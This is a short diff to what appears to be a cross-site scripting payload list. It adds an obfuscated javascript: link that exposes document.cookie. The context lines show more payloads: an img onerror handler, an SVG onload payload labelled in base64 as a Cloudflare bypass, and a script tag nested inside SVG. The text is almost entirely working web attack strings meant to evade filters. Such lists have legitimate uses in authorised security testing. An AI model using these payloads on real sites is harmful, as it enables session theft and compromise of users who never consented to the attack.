@@ -11,6 +11,8 @@ http://aaa#'><img onerror=alert(location) src=.>
 <h1>testing</h1> ----> try this html tag first (if platform vulnerable with html injection, it has possibility to XSS Vulnerbility)
 -----------------------------------------------------------------------
 
+ "></div><a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;document.cookie&rpar;">
+
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")>
 
 <svg><style><script>alert(1)</script></style></svg>
